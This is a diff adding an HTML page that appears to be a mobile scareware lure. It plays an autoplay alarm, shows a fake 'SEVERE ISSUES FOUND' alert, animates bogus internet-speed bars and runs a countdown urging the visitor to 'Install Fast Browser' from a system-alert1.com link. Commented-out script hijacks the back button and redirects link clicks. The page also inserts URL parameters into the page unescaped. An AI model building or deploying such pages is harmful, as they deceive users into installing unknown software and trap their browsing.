@@ -1,0 +1,146 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+  <base href="">
+
+<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+<title>
+**** Внимание!****</title>
+<link href="style3.css" rel="stylesheet" type="text/css">
+<meta content="width=device-width, user-scalable=false; initial-scale=1.0; maximum-scale=1.0" name="viewport">
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
+<script language="JavaScript" type="text/javascript">
+    var count=60;
+    var counter=setInterval(timer, 1000); //1000 will  run it every 1 second
+    
+    function timer(){
+      count=count-1;
+      
+      if (count <= 0){
+        clearInterval(counter);
+        return;
+      }
+      document.getElementById("timer").innerHTML=count + " секунды"; // watch for spelling
+    }
+
+    var parseQueryString = function( queryString ) {
+    var params = {}, queries, temp, i, l;
+
+    // Split into key/value pairs
+    queries = queryString.split("&amp;");
+
+    // Convert the array of strings into an object
+    for ( i = 0, l = queries.length; i < l; i++ ) {
+        temp = queries[i].split('=');
+        params[temp[0]] = temp[1];
+    }
+
+    return params;
+    };
+
+    var queryString = window.location.search;
+    queryString = queryString.substring(1);
+    var queryParams = parseQueryString(queryString);
+
+    var device = queryParams[0];
+    var location = queryParams[1];
+
+    $(document).ready(function(){
+        $("#device").html(device);
+        $("#location").html(location);
+    });
+
+</script>
+ <script type="text/javascript">
+ // ! function() {
+//     var t;
+//     try {
+//         for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+//         onpopstate = function(t) {
+//             t.state && location.replace("\/9f2ac554689148dc32225533f19a0cfba669dfca\/?rcid=Omega-XX5&sid=606547&cat=PTCL&ts=100&s4=&kiv=0.00051&kv=8&puid=5637944449&fl=1")
+//         }
+//     } catch (o) {}
+// }();
+// ! function(t, e, n) {
+//     function a(a) {
+//         var r = a.currentTarget;
+//         (/iPhone|iP[ao]d/.test(navigator.platform) || e.InstallTrigger) && (e._clicked = 1, e.open(r.href, "_blank"), a.preventDefault()), t.location.assign(n)
+//     }
+
+//     function r() {
+//         var e, n, r = t.getElementsByTagName("a");
+//         for (e = 0; e < r.length; ++e) n = r[e], /_blank/i.test(n.target) && n.addEventListener("click", a, !1)
+//     }
+//     t.addEventListener("DOMContentLoaded", r, !1)
+// }(document, window, "\/a8b647796facde845e395de84fb32cf30def7b22\/?rcid=Omega-XX5&sid=606547&cat=PTCL&ts=100&s4=&kiv=0.00051&kv=8&puid=5637944449&fl=2");
+alert("\n****** !!! WARNING !!! ******\n\nSEVERE ISSUES FOUND!\n\nPress OK to repair your device");</script>
+</head>
+
+<body>
+<audio autoplay="autoplay" preload=""><source src="alert.ogg" type="audio/ogg"><source src="alert.mp3" type="audio/mpeg"></audio>
+<div class="wrap" id="wrap" style="height: 300px; max-width: 320px !important;">
+	<h2 style="color:red"> Your Browser is slowing down your Internet Connection</h2>
+    <h3 id="Message">Increase Your <span id="device"></span> Internet Speed (3G / Wifi) by 175.7% NOW.</h3>
+	<p>
+		Your Current Speed:		<span id="current-value">33</span>%</p>
+	<div class="progress-bar">
+		<div class="percent" id="current-speed" style="width: 33%;"></div>
+	</div>
+	<p>
+		Available Speed In <span id="location"></span>:		<span id="value">91</span>%</p>
+	<div class="progress-bar">
+		<div class="percent" id="increase" style="width: 91%;"></div>
+	</div>
+	<p font-size:"18px"="">
+		You Have		<strong><span id="timer" style="margin-bottom: 0!important;font-size: 18px!important;color: rgb(255, 0, 0);">54 seconds</span> </strong>
+		to install the Browser below.	</p>
+	<a href="http://mobile.system-alert1.com/proc.php?102dc15caeb699fbb97d86b0d960565068c06628">
+	<div class="button">
+		Install Fast Browser</div>
+	</a> </div>
+<script>
+window.addEventListener("resize", sreen_height);
+        sreen_height();
+        function sreen_height(){
+            var height = window.innerHeight;
+            document.getElementById("wrap").style.height=(height) +'px';
+        }
+        var i=0;
+        var j=0;
+        
+        
+        
+        function increase_bar_current() {
+            document.getElementById("current-speed").style.width=i+'%';
+            document.getElementById("current-value").textContent=i;
+             i++;
+            t_c = setTimeout(function(){increase_bar_current()}, 20);
+            if(i==54){
+                clearTimeout(t_c);
+                increase_bar();
+            }
+                
+        }
+        
+        
+        
+        function increase_bar() {
+            document.getElementById("increase").style.width=j+'%';
+            document.getElementById("value").textContent=j;
+             j++;
+            t = setTimeout(function(){increase_bar()}, 20);
+            if(j==92){
+                clearTimeout(t);
+                
+            }
+                
+        }
+        
+        setTimeout(increase_bar_current, 1500);
+        
+</script> 
+<br>
+<br>
+<br>
+
+
+</body></html>
